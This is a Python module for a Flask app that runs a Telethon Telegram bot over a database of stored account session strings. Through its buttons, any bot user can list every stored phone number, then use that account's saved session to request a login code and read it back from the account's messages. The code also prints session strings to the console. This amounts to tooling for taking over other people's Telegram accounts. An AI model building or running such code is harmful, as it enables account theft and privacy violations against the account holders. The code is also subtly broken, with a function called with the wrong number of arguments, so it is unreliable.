from flask import Flask
from telethon.sync import TelegramClient, events
from telethon.tl.custom import Button
from .models import TelegramSession
from telethon.sessions import StringSession
import asyncio
from . import db

async def start_telegram_bot(app: Flask):
    with app.app_context():
        api_id = app.config['TELEGRAM_API_ID']
        api_hash = app.config['TELEGRAM_API_HASH']
        bot_token = app.config['BOT_TOKEN']

        bot = TelegramClient('bot', api_id, api_hash)

        def get_all_phone_numbers():
            sessions = TelegramSession.query.all()
            return [session.phone_number for session in sessions]

        def get_session_string(phone_number):
            session = TelegramSession.query.filter_by(phone_number=phone_number).first()
            return session.session_string if session else None

        async def send_verification_code(event, verification_code):
            await event.respond(f"Verification code: {verification_code}")

        def extract_verification_code(session_string):
            parts = session_string.split(';code=')
            if len(parts) > 1:
                code_part = parts[1].split(';')[0]
                return code_part
            return "No code found" 

        @bot.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            await event.respond(
                'Welcome! Please choose an option:',
                buttons=[
                    [Button.inline('View All Numbers', b'show_numbers')],
                    [Button.inline('Read Code', b'read_code')]
                ]
            )

        @bot.on(events.CallbackQuery(data=b'show_numbers'))
        async def callback_handler_show_numbers(event):
            phone_numbers = get_all_phone_numbers()
            phone_list = '\n'.join(phone_numbers)
            await event.edit('Phone Numbers List:\n' + phone_list)

        @bot.on(events.CallbackQuery(data=b'read_code'))
        async def callback_handler_read_code(event):
            await event.respond('Please enter the phone number:')

        @bot.on(events.NewMessage(pattern=r'^\+?\d+$'))
        async def phone_number_handler(event):
            phone_number = event.message.message.strip()
            session_string = get_session_string(phone_number)
            
            if session_string:
                print(f"Session string for {phone_number}: {session_string}")
                await send_verification_code(event, "Waiting for the verification code...")
                await read_verification_code(bot, event, session_string) 
                print(f"Successfully accessed session string for phone number: {phone_number}")
            else:
                await event.respond('Phone number not found or session string is None.')


        async def read_verification_code(bot, event, phone_number, session_string):
            async with TelegramClient(StringSession(session_string), api_id, api_hash) as client:
                await client.connect()
                await client.send_code_request(phone_number)
                try:
                    async for message in client.iter_messages():
                        if "Your login code:" in message.message:
                            verification_code = message.message.split(":")[1].strip()
                            await send_verification_code(event, verification_code)
                            break
                    else:
                        await send_verification_code(event, "Verification code not received.")
                except asyncio.TimeoutError:
                    await send_verification_code(event, "Verification code not received within 2 minutes.")

        await bot.start(bot_token=bot_token)
        await bot.run_until_disconnected()
